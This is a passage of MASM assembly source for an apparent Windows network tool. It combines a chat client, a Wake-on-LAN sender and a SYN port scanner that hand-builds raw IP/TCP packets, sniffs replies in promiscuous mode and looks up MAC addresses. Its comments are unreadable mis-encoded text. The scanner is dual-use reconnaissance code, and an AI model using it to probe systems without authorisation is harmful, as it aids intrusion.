               invoke SetDlgItemInt,_dwPara,IDC_TOTALUSER,eax,FALSE
               ret
             .endif


             ;------------------------------------------
             ; ������������,���ݱ�������Ϊ������������@$@��
             ;------------------------------------------
             invoke InString,1,addr bufRecv,addr MicOrderMark
             .if eax
               ret
             .endif

             invoke SendDlgItemMessage,_dwPara,IDC_PUBLICMESSAGE,EM_SETSEL,-1,-1
             invoke SendDlgItemMessage,_dwPara,IDC_PUBLICMESSAGE,EM_REPLACESEL,0,addr bufRecv

             ret
_recvDataFromServer    endp

;------------------------------------------
; �ͻ����������������Ϣ
;------------------------------------------
_sendClientTalkToServer  proc  hs,_dwPara
                 local @dwTemp,@dwTemp1
                 local @szBuffer[40]:byte
                 local @szSelf[40]:byte
                 local @szFree[5]:byte

                 invoke RtlZeroMemory,addr @szFree,5

                 ;���Լ�˵
                 invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,\
                        CB_GETCURSEL,0,0
                 mov ebx,eax
                 invoke RtlZeroMemory,addr @szBuffer,40
                 invoke RtlZeroMemory,addr @szSelf,40

                 invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,\
                        CB_GETLBTEXT,ebx,addr @szBuffer
                 invoke GetDlgItemText,_dwPara,IDC_NICKNAME,addr @szSelf,40

                 invoke lstrcmp,addr @szBuffer,addr @szSelf
                 .if !eax
                    invoke MessageBox,_dwPara,addr szErrorToSelf,NULL,MB_OK
                    invoke SetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr @szFree   
                    ret
                 .endif 
 
                 ;�Դ�ҹ���,�����256���ַ�
                 .if dwCurrentSelUser==0
                    invoke GetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr bufDisplay,256
                    invoke lstrcat,addr bufDisplay,addr ToAllMark
                    invoke lstrlen,addr bufDisplay
                    invoke send,hs,addr bufDisplay,eax,0
                    invoke SetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr @szFree
                    ret
                 .endif
        
                 ;��ĳ�˹���
                 .if dwCurrentSelUser && !dwPrivacyTalk
                   
                    invoke GetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr bufDisplay,256
                    invoke lstrcat,addr bufDisplay,addr PublicMark
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,\
                           CB_GETCURSEL,0,0
                    mov ebx,eax
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,\
                           CB_GETLBTEXT,ebx,addr @szBuffer
                    invoke lstrcat,addr bufDisplay,addr @szBuffer
                    invoke lstrlen,addr bufDisplay
                    invoke send,hs,addr bufDisplay,eax,0
                    invoke SetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr @szFree
                    ret
                 .endif

                 ;��ĳ��˽��
                 .if dwCurrentSelUser && dwPrivacyTalk
                    invoke GetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr bufDisplay,256
                    invoke lstrcat,addr bufDisplay,addr PrivacyMark
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,\
                           CB_GETCURSEL,0,0
                    mov ebx,eax
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,\
                           CB_GETLBTEXT,ebx,addr @szBuffer
                    invoke lstrcat,addr bufDisplay,addr @szBuffer
                    invoke lstrlen,addr bufDisplay
                    invoke send,hs,addr bufDisplay,eax,0
                    invoke SetDlgItemText,_dwPara,IDC_TALKMESSAGE,addr @szFree
                    ret
                 .endif
                 ret
_sendClientTalkToServer  endp

;-------------------------------
; ��¼�������ݵش��ڹ��̣�����س�������Ϣ
;-------------------------------
_procTalkMessage proc uses ebx edi esi hWnd,uMsg,wParam,lParam
                 
                 mov eax,uMsg
                 .if uMsg==WM_CHAR  ;����û����˻س���
                    mov eax,wParam
                    .if al==0dh
                      invoke _sendClientTalkToServer,hClientSocket,hClientChatWnd
                      invoke CallWindowProc,lpOldTalkMessageProc,\
                           hWnd,uMsg,wParam,lParam
                    .else
                      invoke CallWindowProc,lpOldTalkMessageProc,\
                           hWnd,uMsg,wParam,lParam
                    .endif
                 .else
                    invoke CallWindowProc,lpOldTalkMessageProc,\
                           hWnd,uMsg,wParam,lParam
                    ret
                 .endif
                 xor eax,eax
                 ret
_procTalkMessage endp


;--------------------------
; �Ự�ͻ��˴��ڳ���
;--------------------------
_ProcChatClientMain   proc  uses ebx edi esi hProcessChatClientDlg:HWND,wMsg,wParam,lParam
          local @dwDestLen,@dwLen,@dwTemp
          local @dwCount
          local @stWsa:WSADATA
          local sin:sockaddr_in
          local @lvi:LV_ITEM

          mov @dwDestLen,sizeof sockaddr_in

          .if wMsg==WM_CLOSE
             invoke WSACleanup
             invoke EndDialog,hProcessChatClientDlg,NULL
          .elseif wMsg==WM_INITDIALOG
             invoke GetDlgItem,hProcessChatClientDlg,IDC_USERSLIST
             mov hChatClientTable,eax
             invoke SendMessage,hChatClientTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_FULLROWSELECT
             invoke ShowWindow,hChatClientTable,SW_SHOW

             ;Ϊ�б�����ͼ��
             invoke ImageList_Create,32,32,ILC_COLOR32,4,10
             mov hImageList,eax
             invoke LoadBitmap,hInstance,IDB_MANAGER
             invoke ImageList_Add,hImageList,eax,NULL
             invoke LoadBitmap,hInstance,IDB_ALL
             invoke ImageList_Add,hImageList,eax,NULL
             invoke LoadBitmap,hInstance,IDB_BOY
             invoke ImageList_Add,hImageList,eax,NULL
             invoke LoadBitmap,hInstance,IDB_GIRL
             invoke ImageList_Add,hImageList,eax,NULL
             invoke SendMessage,hChatClientTable,LVM_SETIMAGELIST,\
                    LVSIL_SMALL,hImageList
             invoke _clearUsersView
             invoke _addUsersOnLine,addr lpszToAll,1

             mov eax,hProcessChatClientDlg
             mov hClientChatWnd,eax
             ;��Ϣ������Ϊֻ��
             invoke SendDlgItemMessage,hProcessChatClientDlg,\
                    IDC_PUBLICMESSAGE,EM_SETREADONLY,TRUE,NULL
             invoke SendDlgItemMessage,hProcessChatClientDlg,\
                    IDC_PRIVACYMESSAGE,EM_SETREADONLY,TRUE,NULL
             invoke SetDlgItemText,hProcessChatClientDlg,IDC_SERVERIP,\
                    addr lpszServerIP
             invoke GetDlgItem,hProcessChatClientDlg,IDC_PUBLICMESSAGE
             invoke EnableWindow,eax,FALSE
             invoke GetDlgItem,hProcessChatClientDlg,IDC_PRIVACYMESSAGE
             invoke EnableWindow,eax,FALSE

             invoke GetDlgItem,hProcessChatClientDlg,IDC_NICKNAME
             invoke SetFocus,eax

             invoke WSAStartup,0101h,addr @stWsa

             ;�����������������ı���Ĵ��ڹ���
             invoke GetDlgItem,hProcessChatClientDlg,IDC_TALKMESSAGE
             invoke SetWindowLong,eax,GWL_WNDPROC,addr _procTalkMessage
             mov lpOldTalkMessageProc,eax
          .elseif wMsg==WM_SOCKETCLIENT  ;�Ự�ͻ�������
             mov eax,lParam
             .if ax==FD_CONNECT  ;�����������
                 shr eax,16
                 .if ax
                   invoke closesocket,hClientSocket
                   invoke GetDlgItem,hProcessChatClientDlg,IDC_CONNECTTOSERVER
                   invoke SetWindowText,eax,addr lpszConnect
                 .else
                   invoke GetDlgItem,hProcessChatClientDlg,IDC_CONNECTTOSERVER
                   invoke SetWindowText,eax,addr lpszDisConnect
                   invoke lstrlen,addr bufDisplay
                   invoke send,hClientSocket,addr bufDisplay,eax,0
                 .endif
             .elseif ax==FD_READ
                 invoke _recvDataFromServer,wParam,hProcessChatClientDlg
             .elseif ax==FD_WRITE
                 invoke SetEvent,hEvent
             .elseif ax==FD_CLOSE
                 invoke closesocket,hClientSocket
                 mov hClientSocket,0

             .endif
          .elseif wMsg==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_CHATTO  ;�û�ѡ�����������
               invoke SendDlgItemMessage,hProcessChatClientDlg,IDC_CHATTO,\
                      CB_GETCURSEL,0,0
               mov dwCurrentSelUser,eax
               .if eax==0  ;�������Ϊ���
                  ;��˽������Ϊ��ѡ
                  invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                         FALSE
                  mov dwPrivacyTalk,0
                  invoke GetDlgItem,hProcessChatClientDlg,IDC_PRIVACYTALK
                  invoke EnableWindow,eax,FALSE 
               .else
                  invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                         TRUE
                  mov dwPrivacyTalk,1
                  invoke GetDlgItem,hProcessChatClientDlg,IDC_PRIVACYTALK
                  invoke EnableWindow,eax,TRUE 
               .endif
             .elseif ax==IDC_PRIVACYTALK    ;˽�İ�ť������Ժ�
               invoke IsDlgButtonChecked,hProcessChatClientDlg,IDC_PRIVACYTALK
               .if eax==BST_CHECKED
                  mov dwPrivacyTalk,0
                  invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                         FALSE
               .else
                  mov dwPrivacyTalk,1
                  invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                         TRUE
               .endif
             .elseif ax==IDC_SEXY    ;�Ա�ť������Ժ�
               invoke IsDlgButtonChecked,hProcessChatClientDlg,IDC_SEXY
               .if eax==BST_CHECKED
                  invoke CheckDlgButton,hProcessChatClientDlg,IDC_SEXY,\
                         FALSE
               .else
                  invoke CheckDlgButton,hProcessChatClientDlg,IDC_SEXY,\
                         TRUE
               .endif
             .elseif ax==IDC_SENDCONTENTS  ;�ͻ����������������Ϣ
               invoke _sendClientTalkToServer,hClientSocket,hProcessChatClientDlg
               invoke GetDlgItem,hProcessChatClientDlg,IDC_TALKMESSAGE
               invoke SetFocus,eax
             .elseif ax==IDC_CONNECTTOSERVER  ;��¼������
                 invoke RtlZeroMemory,addr bufNickName,40
                 invoke GetDlgItemText,hProcessChatClientDlg,IDC_CONNECTTOSERVER,\
                        addr bufNickName,40
                 invoke lstrcmp,addr bufNickName,addr lpszDisConnect
                 .if !eax  ;�Ͽ�
                   invoke closesocket,hClientSocket
                   invoke GetDlgItem,hProcessChatClientDlg,IDC_CONNECTTOSERVER
                   invoke SetWindowText,eax,addr lpszConnect
                   invoke SendDlgItemMessage,hProcessChatClientDlg,\
                          IDC_CHATTO,CB_RESETCONTENT,0,0

                   invoke _clearUsersView
                   mov dwCount,0
                   invoke _addUsersOnLine,addr lpszToAll,1
    
                   invoke RtlZeroMemory,addr bufNickName,40
                   invoke SetDlgItemText,hProcessChatClientDlg,\
                          IDC_PUBLICMESSAGE,addr bufNickName
                   invoke SetDlgItemText,hProcessChatClientDlg,\
                          IDC_PRIVACYMESSAGE,addr bufNickName
                   ret
                 .endif


                 ;�����¼��Ϣ���û���+��¼��ʶ+�Ա�
                 invoke RtlZeroMemory,addr bufDisplay,2000
                 invoke RtlZeroMemory,addr bufNickName,40
                 invoke GetDlgItemText,hProcessChatClientDlg,IDC_NICKNAME,\
                        addr bufNickName,40
                 invoke lstrlen,addr bufNickName
                 .if !eax
                   invoke MessageBox,hProcessChatClientDlg,\
                          addr szErrorBlankNickName,NULL,MB_OK
                   ret
                 .endif
                 invoke lstrcat,addr bufDisplay,addr bufNickName
                 invoke lstrcat,addr bufDisplay,addr NickNameMark

                 invoke IsDlgButtonChecked,hProcessChatClientDlg,IDC_SEXY
                 .if eax==BST_CHECKED
                    invoke lstrcat,addr bufDisplay,addr lpszSexA
                 .else
                    invoke lstrcat,addr bufDisplay,addr lpszSexB
                 .endif

                 ;�ڿͻ���Ϊ�û��б���ӡ���ҡ��û�
                 invoke SendDlgItemMessage,hProcessChatClientDlg,\
                         IDC_CHATTO,CB_ADDSTRING,0,addr lpszToAll
                 invoke SendDlgItemMessage,hProcessChatClientDlg,\
                         IDC_CHATTO,CB_SETCURSEL,0,0
                 mov dwCurrentSelUser,0
                 invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                         FALSE
                 invoke GetDlgItem,hProcessChatClientDlg,IDC_PRIVACYTALK
                 invoke EnableWindow,eax,FALSE 

                 ;��ȡ������IP��ַ
                 invoke RtlZeroMemory,addr bufNickName,40
                 invoke GetDlgItemText,hProcessChatClientDlg,IDC_SERVERIP,\
                        addr bufNickName,40
                 invoke socket,AF_INET,SOCK_STREAM,0
                 mov hClientSocket,eax
                 invoke WSAAsyncSelect,hClientSocket,hProcessChatClientDlg,\
                        WM_SOCKETCLIENT,FD_CONNECT or FD_WRITE or FD_READ or FD_CLOSE
                 invoke htons,CHAT_TCP_PORT
                 mov sin.sin_port,ax
                 mov sin.sin_family,AF_INET
                 invoke inet_addr,addr bufNickName
                 mov sin.sin_addr.S_un.S_addr,eax

                 invoke connect,hClientSocket,addr sin,sizeof sin 
             .endif
         .elseif wMsg==WM_NOTIFY   ;����ؼ������ĸ���֪ͨ��
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hChatClientTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwCount,eax   ;��

                    invoke RtlZeroMemory,addr bufNickName,40
                    invoke _GetListViewItem,hChatClientTable,dwCount,0,\
                           addr bufNickName
                    invoke SendDlgItemMessage,hProcessChatClientDlg,\
                           IDC_CHATTO,CB_FINDSTRING,0,addr bufNickName
                    .if eax!=CB_ERR
                       mov dwCurrentSelUser,eax
                       invoke SendDlgItemMessage,hProcessChatClientDlg,\
                           IDC_CHATTO,CB_SETCURSEL,eax,0
                       .if dwCurrentSelUser
                         invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                             TRUE
                         mov dwPrivacyTalk,1
                         invoke GetDlgItem,hProcessChatClientDlg,IDC_PRIVACYTALK
                         invoke EnableWindow,eax,TRUE
                       .else 
                         invoke CheckDlgButton,hProcessChatClientDlg,IDC_PRIVACYTALK,\
                                FALSE
                         mov dwPrivacyTalk,0
                         invoke GetDlgItem,hProcessChatClientDlg,IDC_PRIVACYTALK
                         invoke EnableWindow,eax,FALSE
                       .endif
                       invoke GetDlgItem,hProcessChatClientDlg,IDC_TALKMESSAGE
                       invoke SetFocus,eax
                   .endif   
                .endif
            .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcChatClientMain    endp


_clearPortScanView  proc uses ebx ecx
            invoke _ListViewClear,hPortScanTable
            ;��ӱ�ͷ
            mov ebx,1
            mov eax,150
            lea ecx,lpszPortScanCol1

            invoke _ListViewAddColumn,hPortScanTable,ebx,eax,ecx

            mov ebx,2
            mov eax,100
            lea ecx,lpszPortScanCol2
            invoke _ListViewAddColumn,hPortScanTable,ebx,eax,ecx

            mov ebx,3
            mov eax,100
            lea ecx,lpszPortScanCol3
            invoke _ListViewAddColumn,hPortScanTable,ebx,eax,ecx

            mov ebx,4
            mov eax,155
            lea ecx,lpszPortScanCol4

            invoke _ListViewAddColumn,hPortScanTable,ebx,eax,ecx



            mov ebx,5
            mov eax,60
            lea ecx,lpszPortScanCol5

            invoke _ListViewAddColumn,hPortScanTable,ebx,eax,ecx

            mov dwCount,0
            ret
_clearPortScanView  endp


;--------------------
; ��IPת��Ϊ�ַ���
;--------------------
_IPtoString proc IP:DWORD,lpBuffer:DWORD

    LOCAL dot [4]:BYTE
    LOCAL val1[4]:BYTE
    LOCAL val2[4]:BYTE
    LOCAL val3[4]:BYTE
    LOCAL val4[4]:BYTE

    push esi
    push edi

    mov dword PTR dot, 0000002Eh    ; "."��ַ�ָ���

    movzx esi, BYTE PTR IP[3]
    invoke dwtoa,esi,ADDR val1
    movzx esi, BYTE PTR IP[2]
    invoke dwtoa,esi,ADDR val2
    movzx esi, BYTE PTR IP[1]
    invoke dwtoa,esi,ADDR val3
    movzx esi, BYTE PTR IP[0]
    invoke dwtoa,esi,ADDR val4

    mov edi, lpBuffer
    mov BYTE PTR [edi], 0

    invoke szMultiCat,7,lpBuffer,ADDR val4,ADDR dot,ADDR val3,ADDR dot,
                                 ADDR val2,ADDR dot,ADDR val1
    pop edi
    pop esi

    ret

_IPtoString endp


;-------------------------------
; ����У���
; _lpsz[in] ָ��Э����ֽ������ָ��
; _dwSize[in] Э����ĳ���
; eax[out] ax�а�����У���
;-------------------------------
_calcCheckSum  proc  _lpsz,_dwSize
     local @dwSize
   
     pushad
     mov ecx,_dwSize
     shr ecx,1
     xor ebx,ebx
     mov esi,_lpsz

     cld
     @@:
     lodsw
     movzx eax,ax
     add ebx,eax
     loop @B
     test _dwSize,1
     jz @F
     lodsb
     movzx eax,al
     add ebx,eax
     @@:
     mov eax,ebx
     and eax,0ffffh
     shr ebx,16
     add eax,ebx
     not ax
     mov @dwSize,eax
     popad
     mov eax,@dwSize
     ret
_calcCheckSum endp

;--------------------------------------
; ����Ҫ���͵�TCP���ݰ�������������
; _srcAddr[in]:ԴIP
; _dstAddr[in]:Ŀ��IP
; _port[in]:   Ŀ�Ķ˿�
; send_tcp[out]:����õĴ����͵�TCPЭ���
;
;--------------------------------------
_packetGen  proc _srcAddr,_dstAddr,_port
            local @dwTemp

            ;����TCPͷ
            invoke RtlZeroMemory,addr send_tcp,sizeof tcp_hdr

            invoke htons,dwInitPort
            mov send_tcp.source,ax

            invoke htons,_port
            mov send_tcp.dest,ax

            invoke htons,dwInitPort
            mov send_tcp.seq,eax

            mov send_tcp.ack_seq,0

            mov ebx,5002h
            invoke htons,ebx 
            mov send_tcp.extra,ax
            
            mov eax,0ffffh
            mov send_tcp.window,ax

            ;����TCP���ⱨͷ
            invoke RtlZeroMemory,addr pseudoHdr,sizeof pseudo_hdr

            push _srcAddr
            pop pseudoHdr.source_address
            push _dstAddr
            pop pseudoHdr.dest_address
            mov pseudoHdr.placeholder,0
            mov pseudoHdr.protocol,IPPROTO_TCP
            mov ebx,20
            invoke htons,ebx
            mov pseudoHdr.tcp_length,ax
            mov eax,offset send_tcp

            mov ax,send_tcp.source
            mov pseudoHdr.tcp.source,ax

            mov ax,send_tcp.dest
            mov pseudoHdr.tcp.dest,ax

            push send_tcp.seq
            pop pseudoHdr.tcp.seq

            push send_tcp.ack_seq
            pop pseudoHdr.tcp.ack_seq

            mov ax,send_tcp.extra
            mov pseudoHdr.tcp.extra,ax

            mov ax,send_tcp.window
            mov pseudoHdr.tcp.window,ax


            ;����У���
            mov ecx,32  ;���ⱨͷ��12���ֽڣ�TCPͷ��20���ֽ�
            invoke _calcCheckSum,addr pseudoHdr,ecx

            ;��У���д����Ӧ�ֶ�
            mov ebx,eax
            mov send_tcp.check,ax
            ret
_packetGen  endp



_recvPacket  proc  uses ebx esi edi _lParam
            local @stFdSet:fd_set
            local @stTimeval:timeval
            local @line
            local @lpIP,@dwIP,@dwMacSize
            local @macAddress[8]:byte
            local @bufTemp[3]:byte
            local @saDest:in_addr



            .while TRUE
             .if !bStopRecvPacket
                ;�������ݰ�
                mov @stFdSet.fd_count,1
                push hRecvSocket
                pop @stFdSet.fd_array
                mov @stTimeval.tv_sec,0
                push syn_timeout
                pop @stTimeval.tv_usec
                invoke select,0,addr @stFdSet,NULL,NULL,addr @stTimeval
                .if eax==SOCKET_ERROR
                  mov bStopRecvPacket,1
                  invoke WSAGetLastError
                  invoke wsprintf,addr szBuffer,addr szOut,eax
                  invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
                .elseif eax  ;���û�г�ʱ
                  invoke recv,hRecvSocket,addr recvBuffer,sizeof recv_tcp,0
                  ;�������ݰ�
                  movzx ecx,dwInitPort
                  invoke htons,ecx
                  .if ax==recvBuffer.tcp.dest  ;���ذ���Ŀ�Ķ˿�Ϊ�����趨�����Ӷ˿�
                    mov bStopRecvPacket,1
                    invoke WSACleanup
                    mov ax,recvBuffer.tcp.extra
                    mov cx,ax
                    and cx,12h
                    .if !cx  ;��[ACK][SYN]��λ���˿��ѱ���
                      mov dwPortStatus,1
                      mov esi,offset arrPortScanStatus
                      mov eax,recvBuffer.ip.ip_src
                      mov dword ptr [esi],eax
                      movzx eax,recvBuffer.tcp.source
                      mov dword ptr [esi+4],eax
                      mov eax,dwPortStatus
                      mov dword ptr [esi+8],eax
                      invoke SendMessage,hPortScanDlg,WM_PORTSCANFINISHED,addr arrPortScanStatus,0
                    .else    ;��[ACK][RST]��λ���ö˿ڲ�����
                      mov dwPortStatus,2
                      mov esi,offset arrPortScanStatus
                      mov eax,recvBuffer.ip.ip_src
                      mov dword ptr [esi],eax
                      movzx eax,recvBuffer.tcp.source
                      mov dword ptr [esi+4],eax
                      mov eax,dwPortStatus
                      mov dword ptr [esi+8],eax

                      invoke RtlZeroMemory,addr @saDest,sizeof in_addr
                      mov eax,dword ptr [esi]
                      mov @dwIP,eax
                      mov @dwMacSize,6
                      invoke SendARP,@dwIP,NULL,addr @macAddress,addr @dwMacSize
                      .if eax==NO_ERROR
                         invoke RtlZeroMemory,addr lpszGetInfo,sizeof lpszGetInfo
                         mov al,byte ptr @macAddress[0]
                         invoke wsprintf,addr @bufTemp,addr lpszScanFmt,al
                         invoke lstrcat,addr lpszGetInfo,addr @bufTemp
                         invoke lstrcat,addr lpszGetInfo,addr lpszSplit
                         mov al,byte ptr @macAddress[1]
                         invoke wsprintf,addr @bufTemp,addr lpszScanFmt,al
                         invoke lstrcat,addr lpszGetInfo,addr @bufTemp
                         invoke lstrcat,addr lpszGetInfo,addr lpszSplit
                         mov al,byte ptr @macAddress[2]
                         invoke wsprintf,addr @bufTemp,addr lpszScanFmt,al
                         invoke lstrcat,addr lpszGetInfo,addr @bufTemp
                         invoke lstrcat,addr lpszGetInfo,addr lpszSplit
                         mov al,byte ptr @macAddress[3]
                         invoke wsprintf,addr @bufTemp,addr lpszScanFmt,al
                         invoke lstrcat,addr lpszGetInfo,addr @bufTemp
                         invoke lstrcat,addr lpszGetInfo,addr lpszSplit
                         mov al,byte ptr @macAddress[4]
                         invoke wsprintf,addr @bufTemp,addr lpszScanFmt,al
                         invoke lstrcat,addr lpszGetInfo,addr @bufTemp
                         invoke lstrcat,addr lpszGetInfo,addr lpszSplit
                         mov al,byte ptr @macAddress[5]
                         invoke wsprintf,addr @bufTemp,addr lpszScanFmt,al
                         invoke lstrcat,addr lpszGetInfo,addr @bufTemp
                     .else
                         invoke GetLastError
                         invoke showDW,eax,1
                     .endif

                     invoke SendMessage,hPortScanDlg,WM_PORTSCANFINISHED,addr arrPortScanStatus,0
                    .endif
                    .break 
                  .endif
                .else        ;��ʱ���������粻ͨ������Ŀ������δ����
                    invoke WSACleanup
                    mov bStopRecvPacket,1
                    mov dwPortStatus,3
                    ;invoke SendMessage,hPortScanDlg,WM_PORTSCANFINISHED,addr arrPortScanStatus,0
                    .break
                .endif
              .endif
            .endw
            ret
_recvPacket  endp


;----------------------
; ������㲥UDP���ݰ�
; ����ǰ���ݰ�Ӧ����magicPkt�ṹ���Ѿ��������
;----------------------
_sendMagicPacket   proc
            local @bRet
            local @stWsa:WSADATA
            local sin:sockaddr_in
            local @addrLocal:sockaddr_in
            local @dwSinLen,@dwIPLen
            local @dwDestIP,@dwSourceIP
            local @dwFlag
            local localHostent:hostent
            local hAddr:in_addr
            local @lpHostent
            local @ip,@dwTemp,@dwTemp1
            local @ipHdr:ip_hdr
            local @dwThreadID
            local @dwValue
            local _lpszIPAddress
            local _port
            local _dwPara

            mov eax,offset bufBroadcast
            mov _lpszIPAddress,eax

            invoke WSAStartup,0202h,addr @stWsa

            ;����ԭ�������׽���
            invoke WSASocket,AF_INET,SOCK_DGRAM,IPPROTO_UDP,NULL,0,WSA_FLAG_OVERLAPPED
            mov hPortScanSocket,eax
            ;���÷��͹㲥��
            invoke setsockopt,hPortScanSocket,SOL_SOCKET,SO_BROADCAST,addr bOptVal,sizeof bOptVal
            .if eax==SOCKET_ERROR
               invoke wsprintf,addr szBuffer,addr szOut,eax
               invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            mov _port,0                       ;�˿�����ֵ
            invoke htons,_port
            mov sin.sin_port,ax
            mov sin.sin_family,AF_INET
            invoke inet_addr,_lpszIPAddress   ;�㲥��ַ
            mov @dwDestIP,eax
            mov sin.sin_addr.S_un.S_addr,eax

            ;�������ݰ�
            invoke sendto,hPortScanSocket,addr magicPkt,sizeof magic_pkt,0,\
                   addr sin,sizeof sockaddr_in

            .if eax==SOCKET_ERROR
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            invoke closesocket,hPortScanSocket
            invoke WSACleanup
            ret
_sendMagicPacket   endp


;---------------------------
; �˿�ɨ�裬���������
; _dwPara(in):         ���ھ��
; _lpszIPAddress(in):  10.121.43.100
; _port(in):           8080
; bufRecv(out)
; eax��   �Ƿ����ӳɹ�
;---------------------------
_portScan   proc  
            local @bRet
            local @stWsa:WSADATA
            local sin:sockaddr_in
            local @addrLocal:sockaddr_in
            local @dwSinLen,@dwIPLen
            local @dwDestIP,@dwSourceIP
            local @dwFlag
            local localHostent:hostent
            local hAddr:in_addr
            local @lpHostent
            local @ip,@dwTemp,@dwTemp1
            local @ipHdr:ip_hdr
            local @dwThreadID
            local @dwValue
            local _lpszIPAddress
            local _port
            local _dwPara

            mov eax,offset bufDisplay
            mov _lpszIPAddress,eax
            mov eax,dwCurrentPort
            mov _port,eax
            mov eax,hPortScanDlg
            mov _dwPara,eax

            mov @dwValue,1
            mov @dwFlag,TRUE
            mov @bRet,FALSE

            invoke WSAStartup,0202h,addr @stWsa

            ;����ԭ�������׽���
            invoke WSASocket,AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED
            mov hPortScanSocket,eax
            ;�Լ����IP��ͷ
            invoke setsockopt,hPortScanSocket,IPPROTO_IP,IP_HDRINCL,addr @dwFlag,sizeof @dwFlag
            .if eax==SOCKET_ERROR
               invoke wsprintf,addr szBuffer,addr szOut,eax
               invoke MessageBox,NULL,addr lpszOne,NULL,MB_OK
            .endif
            ;���ó�ʱʱ��
            invoke setsockopt,hPortScanSocket,SOL_SOCKET,SO_SNDTIMEO,addr syn_timeout,sizeof syn_timeout
            .if eax==SOCKET_ERROR
               invoke wsprintf,addr szBuffer,addr szOut,eax
               invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            invoke htons,_port
            mov sin.sin_port,ax
            mov sin.sin_family,AF_INET
            invoke inet_addr,_lpszIPAddress
            mov @dwDestIP,eax
            mov sin.sin_addr.S_un.S_addr,eax

            mov eax,sizeof sockaddr_in
            mov @dwSinLen,eax

            invoke _getLocalIP

            invoke inet_addr,addr lpszLocalIP
            mov @dwSourceIP,eax

            mov ecx,sizeof tcp_hdr
            add ecx,sizeof ip_hdr
            mov @dwIPLen,ecx

            ;���IP�ײ�
            mov @ipHdr.ip_hlv,45h
            mov @ipHdr.ip_tos,00h
            mov ebx,@dwIPLen
            invoke htons,ebx
            mov @ipHdr.ip_len,ax
            mov @ipHdr.ip_id,1
            mov @ipHdr.ip_off,00h
            mov @ipHdr.ip_ttl,80h
            mov @ipHdr.ip_p,IPPROTO_TCP
            mov @ipHdr.ip_cksum,0
            push @dwSourceIP
            pop @ipHdr.ip_src
            push @dwDestIP
            pop @ipHdr.ip_dest
            
            ;����IP��ͷУ���       
            mov ecx,sizeof ip_hdr  
            invoke _calcCheckSum,addr @ipHdr,ecx

            ;��У���д����Ӧ�ֶ�
            mov ebx,eax
            mov @ipHdr.ip_cksum,ax

            ;����TCP�ײ�
            invoke _packetGen,@dwSourceIP,@dwDestIP,_port

            ;����IP��
            mov sendBuffer.ip.ip_hlv,45h
            mov sendBuffer.ip.ip_tos,00h
            mov ebx,@dwIPLen
            invoke htons,ebx
            mov sendBuffer.ip.ip_len,ax
            mov sendBuffer.ip.ip_id,0100h  ;��ʶΪ1
            mov sendBuffer.ip.ip_off,00h
            mov sendBuffer.ip.ip_ttl,80h
            mov sendBuffer.ip.ip_p,IPPROTO_TCP
            mov ax,@ipHdr.ip_cksum
            mov sendBuffer.ip.ip_cksum,ax
            push @dwSourceIP
            pop sendBuffer.ip.ip_src
            push @dwDestIP
            pop sendBuffer.ip.ip_dest

            mov ax,send_tcp.source
            mov sendBuffer.tcp.source,ax
            mov ax,send_tcp.dest
            mov sendBuffer.tcp.dest,ax
            push send_tcp.seq
            pop sendBuffer.tcp.seq
            push send_tcp.ack_seq
            pop sendBuffer.tcp.ack_seq
            mov ax,send_tcp.extra
            mov sendBuffer.tcp.extra,ax
            mov ax,send_tcp.window
            mov sendBuffer.tcp.window,ax
            mov ax,send_tcp.check
            mov sendBuffer.tcp.check,ax
            mov ax,send_tcp.urg_ptr
            mov sendBuffer.tcp.urg_ptr,ax

            ;����IP��ͷУ���       
            mov ecx,sizeof ip_hdr
            add ecx,sizeof tcp_hdr
            invoke _calcCheckSum,addr sendBuffer,ecx

            ;��У���д����Ӧ�ֶ�
            mov ebx,eax
            mov sendBuffer.ip.ip_cksum,ax

            ;����������
            invoke socket,AF_INET,SOCK_RAW,IPPROTO_IP
            mov hRecvSocket,eax

            invoke htons,dwLocalBindingPort
            mov @addrLocal.sin_port,ax
            mov @addrLocal.sin_family,AF_INET
            mov eax,@dwSourceIP
            mov @addrLocal.sin_addr.S_un.S_addr,eax

            invoke bind,hRecvSocket,addr @addrLocal,sizeof sockaddr_in ;�� sockRaw �󶨵�����������

            .if eax==SOCKET_ERROR
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            invoke ioctlsocket,hRecvSocket,SIO_RCVALL,addr @dwValue  ;�� sockRaw �������е�����
            .if eax==SOCKET_ERROR
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif


            ;�����������ݰ�����
